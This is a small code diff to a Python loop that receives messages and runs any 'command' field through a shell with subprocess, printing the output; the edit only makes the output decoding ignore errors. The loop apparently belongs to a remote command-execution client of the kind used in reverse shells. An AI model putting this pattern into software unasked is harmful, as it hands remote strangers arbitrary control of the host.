@@ -23,7 +23,7 @@ while True:
     result = receive()
     if 'command' in result:
         try:
-            result = subprocess.check_output(result['command'],shell=True).decode("utf-8")
+            result = subprocess.check_output(result['command'],shell=True).decode("utf-8","ignore")
         except:
             pass
         print(result)
